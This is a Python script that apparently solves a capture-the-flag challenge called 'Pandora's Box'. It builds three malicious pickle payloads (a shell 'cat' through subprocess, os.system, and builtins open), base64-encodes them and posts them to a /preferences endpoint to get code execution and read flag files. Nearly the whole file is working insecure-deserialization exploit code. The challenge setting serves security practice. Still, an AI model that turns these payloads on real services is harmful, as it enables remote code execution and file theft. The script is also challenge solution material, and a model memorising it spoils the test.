"""Pandora's Box: Insecure Deserialization solver."""
from flag_utils import extract_flag
import requests
import pickle
import base64
import os

class PandoraSolver:
    """Pickle deserialization RCE to read flag file."""

    def __init__(self, agent):
        self.agent = agent
        self.base_url = agent.base_url

    def solve(self):
        """
        POST /preferences with malicious pickle payload to read /flag.txt
        """
        print("=== Pandora's Box: Insecure Deserialization ===", flush=True)

        # Create malicious pickle payload
        # We want to execute code that reads /flag.txt and returns it

        class Exploit:
            def __reduce__(self):
                # Return a command that reads the flag file
                # Common locations
                import subprocess
                cmd = "cat /flag.txt /flag /app/flag.txt /root/flag.txt 2>/dev/null"
                return (subprocess.check_output, (["/bin/sh", "-c", cmd],))

        # Try multiple payload strategies
        payloads = []

        # Strategy 1: Direct file read via subprocess
        try:
            exploit = Exploit()
            pickled = pickle.dumps(exploit)
            encoded = base64.b64encode(pickled).decode('utf-8')
            payloads.append(("subprocess", encoded))
        except Exception as e:
            print(f"Failed to create subprocess payload: {e}", flush=True)

        # Strategy 2: Use os.system (might not return output but worth trying)
        # Note: os.system is intentionally used here as a pickle deserialization exploit payload
        class ExploitOS:
            def __reduce__(self):
                return (os.system, ("cat /flag.txt",))

        try:
            exploit = ExploitOS()
            pickled = pickle.dumps(exploit)
            encoded = base64.b64encode(pickled).decode('utf-8')
            payloads.append(("os.system", encoded))
        except Exception as e:
            print(f"Failed to create os.system payload: {e}", flush=True)

        # Strategy 3: Use __builtins__.open
        class ExploitOpen:
            def __reduce__(self):
                return (__builtins__.open, ("/flag.txt",))

        try:
            exploit = ExploitOpen()
            pickled = pickle.dumps(exploit)
            encoded = base64.b64encode(pickled).decode('utf-8')
            payloads.append(("open", encoded))
        except Exception as e:
            print(f"Failed to create open payload: {e}", flush=True)

        # Try each payload
        for name, payload in payloads:
            try:
                print(f"Trying {name} payload", flush=True)
                resp = requests.post(
                    f"{self.base_url}/preferences",
                    json={"data": payload},
                    timeout=10
                )
                print(f"  Status: {resp.status_code}", flush=True)
                print(f"  Response: {resp.text[:500]}", flush=True)

                # Look for flag in response
                flag = extract_flag(resp.text)
                if flag:
                        return flag

            except Exception as e:
                print(f"  Error with {name}: {e}", flush=True)

        print("Failed to exploit pickle deserialization", flush=True)
        return None
